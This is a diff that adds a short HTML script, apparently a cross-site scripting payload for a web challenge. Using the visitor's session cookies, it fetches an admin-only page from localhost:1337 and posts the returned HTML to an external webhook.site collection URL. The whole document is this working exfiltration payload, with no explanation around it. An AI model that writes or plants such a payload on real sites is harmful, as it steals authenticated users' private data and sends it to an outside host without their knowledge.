@@ -1,0 +1,14 @@
+<script>
+    fetch('http://localhost:1337/posts/view/admin', {
+        mode: 'cors',
+        credentials: 'include',
+        method: 'GET',
+    }).then(response => {
+        return response.text();
+    }).then(htmlContent => {
+        fetch('https://webhook.site/8e452d77-83fe-43cf-963b-4d344544f146', {
+            method: 'POST',
+            body: htmlContent,
+        });
+    });
+</script>
